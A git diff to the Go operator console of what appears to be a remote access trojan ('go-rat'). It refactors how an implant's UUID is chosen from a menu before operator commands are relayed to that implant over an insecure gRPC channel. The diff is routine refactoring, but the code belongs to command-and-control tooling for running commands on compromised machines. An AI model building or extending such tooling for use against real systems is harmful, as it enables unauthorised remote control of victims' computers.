@@ -9,6 +9,7 @@ import (
 
 	"github.com/charmbracelet/lipgloss"
 	"github.com/charmbracelet/log"
+	"github.com/google/uuid"
 	"github.com/iortego42/go-rat/grpcapi"
 	"google.golang.org/grpc"
 	"google.golang.org/grpc/credentials/insecure"
@@ -18,7 +19,7 @@ var PROMPT = lipgloss.NewStyle().
 	SetString("> ").
 	Foreground(lipgloss.Color("#9fe0f0"))
 
-func mainLoop(client grpcapi.AdminClient) {
+func mainLoop(client grpcapi.AdminClient, implant uuid.UUID) {
 	var (
 		ctx context.Context
 		cmd *grpcapi.Command
@@ -27,8 +28,7 @@ func mainLoop(client grpcapi.AdminClient) {
 	ctx = context.Background()
 	cmd = new(grpcapi.Command)
 
-	id := os.Args[1]
-	cmd.Id = id
+	cmd.Id = implant.String()
 	s := bufio.NewScanner(os.Stdin)
 	for {
 		cmd.Out = ""
@@ -41,7 +41,7 @@ func mainLoop(client grpcapi.AdminClient) {
 		}
 		cmd, err = client.RunCommand(ctx, cmd)
 		if cmd == nil && err == nil {
-			log.Info("Implant cerrado", "id", id)
+			log.Info("Implant cerrado", "id", implant.String())
 			return
 		}
 		if err != nil {
@@ -65,6 +65,10 @@ func main() {
 	}
 	defer conn.Close()
 	client = grpcapi.NewAdminClient(conn)
-	implantsMenu(client)
-	mainLoop(client)
+	id := implantsMenu(client)
+	implant, err := uuid.Parse(id)
+	if err != nil {
+		log.Fatal("Not a valid ID", "error", err, "id", id)
+	}
+	mainLoop(client, implant)
 }
